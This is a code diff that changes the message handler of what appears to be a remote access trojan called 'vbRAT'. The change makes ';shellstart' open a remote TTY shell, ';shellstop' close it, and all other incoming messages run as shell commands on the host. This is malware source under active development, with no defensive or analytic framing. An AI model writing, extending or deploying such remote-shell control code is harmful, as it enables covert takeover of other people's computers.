@@ -35,19 +35,18 @@ int shellstart=0;
 void vbRAT_messageReceived(const char* buf, int len)
 {
     std::string cmd = buf;
-    if(strcmp(buf, ";shellstart")==0)
+
+    if(vbTTY_isOpen())
     {
-        if(shellstart!=2)
+        if(strcmp(buf, ";shellstop")==0)
+            vbTTY_stopShell();
+        else
+            vbTTY_send(buf);
+    }
+    else if(strcmp(buf, ";shellstart")==0)
+    {
+        if(!vbTTY_isOpen())
             vbTTY_startShell(ttyread);
-        shellstart=1;
-    }
-    else if(strcmp(buf, ";shellstop")==0)
-    {
-        shellstart=2;
-    }
-    else if(shellstart==1)
-    {
-        vbTTY_send(buf);
     }
     else if(strstr(buf, ";ip="))
     {
@@ -90,7 +89,7 @@ void vbRAT_messageReceived(const char* buf, int len)
             it2++;
         }
     }
-   // else
+    //else
     //    vbConnection_Send("~sorry, unknown command.");
 
 }
